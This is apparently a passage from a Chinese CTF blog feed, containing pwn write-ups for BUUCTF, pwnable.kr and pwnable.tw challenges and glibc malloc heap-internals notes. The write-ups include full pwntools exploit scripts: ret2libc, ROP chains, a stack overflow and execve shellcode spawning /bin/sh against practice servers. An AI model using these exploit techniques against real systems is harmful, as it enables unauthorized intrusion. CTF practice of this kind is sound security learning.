alt=""></p><p>向buf中读入了一个随机数</p><p>下面两个函数依次是</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-29_220426.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-29_220452.png" alt=""></p><p>这里有两个不大熟悉的函数,原型及功能分别是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncmp</span>(<span class="type">const</span> <span class="type">char</span> *str1,<span class="type">const</span> cahr *str2,<span class="type">size_t</span> n)</span><br><span class="line">将str1与str2比较,最多比较前n个字节</span><br><span class="line"><span class="built_in">sprintf</span>(<span class="type">char</span> *<span class="built_in">string</span>,<span class="type">char</span> *format,arg_list);</span><br><span class="line">将格式化字符串format打印并送入<span class="built_in">string</span>字符串,arg_list是参数列表</span><br></pre></td></tr></table></figure><p>可以看到最后一个函数的读入字节数由第二个函数的返回值决定,</p><p>细看第二个函数,将s与buf比较,s中存的是随机数,肯定猜不到,这里也没有办法能够泄露或改写它,那么只能令v1等于0,即比较0个字节是否相同,那必然是相等的,要使v1等于0,只要buf开头是\0就行了,最后返回的是buf第8个字节</p><p>之后这题没有后门函数也没有binsh,那就是libc泄露类题目</p><p>最终exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=e.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">p=remote()</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xFF&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">235</span>+p32(puts_plt)+p32(<span class="number">0x08048825</span>)+p32(puts_got))</span><br><span class="line">puts=u32(p.recv()[-<span class="number">5</span>:-<span class="number">1</span>])  <span class="comment">#调用的是puts会自动在输出末尾加上换行注意过滤，这里其实直接p.recv(4)就行了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libc_base=puts-libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()  <span class="comment">#搜索已加载的C标准库中/bin/sh字符串的内存地址，并使用.__next__()方法来检索在库中找到的该字符串的第一个内存地址。</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xFF&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">235</span>+p32(system)+p32(<span class="number">0</span>)+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>离大谱,自己泄露出来的libc怎么也打不通,最后发现题目给了libc🤡</p><p>细心的可能发现了</p><p>main_addr=e.symbols[‘__libc_start_main’]</p><p>这一句根本没用上</p><p>因为找不到main的symbols</p><p>所以我本来是打算用__libc_start_main作第一次rop的返回地址,但可以发现后面并没有使用它,因为这么做是打不通的,至于为什么</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-29_232747.png" alt=""></p><p><strong>__libc_start_main是需要参数的</strong></p><p>脑子短路了</p><p>因为这个硬生生被卡住了半个小时</p><p>也算吃了个教训,以后<strong>返回地址不能用__libc_start_main</strong></p><p><u>(之所以我会这么做,是因为我记岔了,__libc_start_main是可以用来做被泄露的函数,但我记成可以做返回地址了)</u></p><h1 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h1><p>与jarvisoj_level2一样只不过变成了64位，注意参数传递方式即可</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28252</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x00000000004006b3</span></span><br><span class="line">binsh=<span class="number">0x600A90</span></span><br><span class="line">system=<span class="number">0x400603</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">136</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h1><p>和上一题一模一样</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26832</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000400683</span></span><br><span class="line">binsh=<span class="number">0x601048</span></span><br><span class="line">system=<span class="number">0x4005E3</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr刷题记录-1</title>
      <link href="/posts/4569/"/>
      <url>/posts/4569/</url>
      
        <content type="html"><![CDATA[<h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p>ssh连上之后，ls发现三个有效文件fd,fd.c,flag</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-20_220727.png" alt=""></p><p>flag没有任何权限向我们开放</p><p>再看fd.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fd@pwnable:~$ cat fd.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码问题不大,考验的就是对linux系统read函数最基本的了解了,0是标准输入,使fd为0即可,0x1234转换为十进制即是4660</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fd 4660</span><br></pre></td></tr></table></figure><ul><li>atoi()：atoi()函数会扫描参数 str 字符串，跳过前面的空白字符（例如空格，tab 缩进等，可以通过 isspace() 函数来检测），直到遇上数字或正负符号才开始做转换，而再遇到非数字或字符串结束时(‘\0’)才结束转换，并将结果返回，返回转换后的整型数；如果 str 不能转换成 int 或者 str 为空字符串，那么将返回 0。</li></ul><hr><h1 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h1><p>连上后三个文件,文件样式和权限和上一题一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line"><span class="type">int</span>* ip = (<span class="type">int</span>*)p;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c语言基础不牢,char* a[]知道是由字符指针组成的数组,但一时竟不知道每一个成员还可以代表指向一个字符串🤔</p><p>输入要为20个字节(字符),以16进制存储,进入check函数,会被强制转为int*指针,即输入的20个字符被视为了5个int数</p><p>现在就是要想办法构造出hashcode了,这里构造四处查了一些资料,有两种办法</p><ol><li>全部用可打印字符表示,好处是直观,但要计算有点麻烦</li><li>无论是否可见用十六进制ascii码表示,好处是基本没有计算量,但直接输入十六进制数据依然会被视作字符,所以需要用到python</li></ol><p>我选择用第二种方法(因为第一种要控制可打印字符大麻烦了😢)</p><p>键入(别忘了小端序)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col $(python -c <span class="string">&#x27;print &quot;\x01&quot;*16+&quot;\xe8\x05\xd9\x1d&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>前面的16字节我一开始还打算用\x00填充,还想怎么老是提示长度不够,结果忘了strlen()测量长度到\x00结束🙂</p><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p>是熟悉的味道😭</p><p>检查保护</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-21_163931.png" alt=""></p><p>ida看一看</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-21_163837.png" alt=""></p><p>a1是这个函数的参数,也就是在返回地址上一个</p><p>使a1的值为-889275714,我还傻乎乎的打算去用补码换算成十六进制,结果发现汇编代码中就有直接的十六进制数据0CAFEBABEh</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span>+<span class="string">b&#x27;\xbe\xba\xfe\xca&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>给了一个flag文件，ida打开提示upx加壳，脱壳后flag以明文形式存在</p>]]></content>
      
      
      <categories>
          
          <category> 题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw刷题记录-1</title>
      <link href="/posts/10836/"/>
      <url>/posts/10836/</url>
      
        <content type="html"><![CDATA[<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>第一步检查保护,是久违的感觉😂</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-20_082554.png" alt=""></p><hr><p>ida打开看看</p><p>不难发现其不是标准栈帧结构,🔒以ida反汇编不了(百度可以搜索解决办法),好在不长直接看汇编代码吧.</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-20_091524.png" alt=""></p><p>程序主体是两个系统调用read和write,其中read读取60个字节明显有溢出,但要怎么利用是关键</p><p>首选自然是ret2shellcode了,但ret2shellcode需要栈地址,可以看到程序起始有向栈中压入esp,我们可以选择借用write系统调用将其泄露,剩下的就是常规操作了</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">0x8048087</span>))</span><br><span class="line">stack=u32(p.recv(<span class="number">4</span>))+<span class="number">0x14</span> <span class="comment">#加14是因为最后又抬高了esp一次</span></span><br><span class="line">p.recv()</span><br><span class="line">sh=<span class="string">b&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(stack)+sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-201.png" alt=""></p><h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><p>保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/orw&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>沙盒题,getshell是很难做到的</p><p>程序的内容十分简单,比上一题还简单</p><p>但是因为orw的缘故也不白给</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwnable.tw </tag>
            
            <tag> 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆学习笔记-2</title>
      <link href="/posts/40023/"/>
      <url>/posts/40023/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一篇堆学习笔记主要还是基础性的知识要多一点，像malloc和free的流程都只是贴了张图，这篇文章则稍微更深入一点点。</p><h1 id="无tcache"><a href="#无tcache" class="headerlink" title="无tcache"></a>无tcache</h1><h2 id="malloc初始化"><a href="#malloc初始化" class="headerlink" title="malloc初始化"></a>malloc初始化</h2><p>malloc的入口是是_libc_malloc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* __libc_malloc (<span class="type">size_t</span> bytes) &#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line">  <span class="comment">// First part: callback</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">  <span class="comment">// Second part  </span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">// Third part</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码可以看出，主要包含<strong>callback、arena_get、_int_malloc</strong>这几步，我们把<strong>callback和arena_get当作初始化</strong>的过程，_<strong>int_malloc作为实际分配</strong>的过程，本文着重来看初始化的过程，下篇文章再看_int_malloc。</p><p>再额外说一下builtin_expect，它是gcc的扩展，用来允许程序员将最有可能执行的分支告诉编译器，这样编译器就可以对分支预测做一些优化，简单来讲就是在遇到分支的时候，先生成大概率分支的指令，这样指令cache的命中率会变高，具体细节可以参考gcc的官方文档（以GCC10.1为例：<a href="https://gcc.gnu.org/onlinedocs/gcc-10.1.0/gcc/Other-Builtins.html#Other-Builtins），有时也会将__builtin_expect指令封装为likely和unlikely宏，它们的定义如下所示：">https://gcc.gnu.org/onlinedocs/gcc-10.1.0/gcc/Other-Builtins.html#Other-Builtins），有时也会将__builtin_expect指令封装为likely和unlikely宏，它们的定义如下所示：</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __builtin_expect(expr, val) (expr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> likely(expr) __builtin_expect(!!(expr), 1) <span class="comment">//expr很可能为真</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlikely(expr) __builtin_expect(!!(expr), 0) <span class="comment">//expr很可能为假</span></span></span><br></pre></td></tr></table></figure><h3 id="callback"><a href="#callback" class="headerlink" title="callback"></a>callback</h3><p>先看前面代码1中的first part，如下两句，第一句是给函数指针变量赋值，第二句是函数调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>hook是一个函数指针变量，被赋值成了__malloc_hook，后者定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__malloc_hook)</span></span><br><span class="line">  <span class="params">(<span class="type">size_t</span> __size, <span class="type">const</span> <span class="type">void</span> *)</span> = malloc_hook_ini;</span><br></pre></td></tr></table></figure><p>__malloc_hook被初始化成了malloc_hook_ini，后者定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">malloc_hook_ini</span> <span class="params">(<span class="type">size_t</span> sz, <span class="type">const</span> <span class="type">void</span> *caller)</span> &#123;</span><br><span class="line">  __malloc_hook = <span class="literal">NULL</span>;</span><br><span class="line">  ptmalloc_init ();</span><br><span class="line">  <span class="keyword">return</span> __libc_malloc (sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<strong>malloc_hook又被赋值成了NULL，然后再重新调用</strong>libc_malloc，这样就可以保证在多次调用__libc_malloc的情况下，代码1中的hook回调函数只会被调用一次，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_170117.png" alt=""></p><p>这个函数里的ptmalloc_init的精简定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ptmalloc_init</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  __malloc_initialized = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  thread_arena = &amp;main_arena;</span><br><span class="line">  malloc_init_state (&amp;main_arena);</span><br><span class="line">  </span><br><span class="line">  __malloc_initialized = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到通过__malloc_initialized这个全局flag来检测是不是已经初始化过了，如果没有，则把main_arena设成当前的thread_arena，这是因为初始化肯定是主线程在做，而主线程用的是main_arena，然后再调用malloc_init_state进一步初始化，malloc_init_state定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">malloc_init_state</span> <span class="params">(mstate av)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  mbinptr bin;</span><br><span class="line">  <span class="comment">// part1</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i) &#123;</span><br><span class="line">      bin = bin_at (av, i);</span><br><span class="line">      bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// part2</span></span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    set_max_fast(DEFAULT_MXFAST);</span><br><span class="line">  av-&gt;top = initial_top (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc_init_state的part1把malloc_state中的bins array初始化成了下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_170451.png" alt=""></p><p>malloc_init_state的part2把malloc_state中的top初始化成了指向上图2中的bin1，修改top后如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_170512.png" alt=""></p><h3 id="arena-get"><a href="#arena-get" class="headerlink" title="arena_get"></a>arena_get</h3><p>介玩意是个宏,源代码里有一段解释:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* arena_get() acquires an arena and locks the corresponding mutex.</span></span><br><span class="line"><span class="comment">   First, try the one last locked successfully by this thread.  (This</span></span><br><span class="line"><span class="comment">   is the common case and handled with a macro for speed.)  Then, loop</span></span><br><span class="line"><span class="comment">   once over the circularly linked list of arenas.  If no arena is</span></span><br><span class="line"><span class="comment">   readily available, create a new one.  In this latter case, `size&#x27;</span></span><br><span class="line"><span class="comment">   is just a hint as to how much memory will be required immediately</span></span><br><span class="line"><span class="comment">   in the new arena. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      ptr = thread_arena;      \</span></span><br><span class="line"><span class="meta">      arena_lock (ptr, size);      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_lock(ptr, size) do &#123;      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (ptr)      \</span></span><br><span class="line"><span class="meta">        __libc_lock_lock (ptr-&gt;mutex);      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">else</span>      \</span></span><br><span class="line"><span class="meta">        ptr = arena_get2 ((size), NULL);      \</span></span><br><span class="line"><span class="meta">  &#125; while 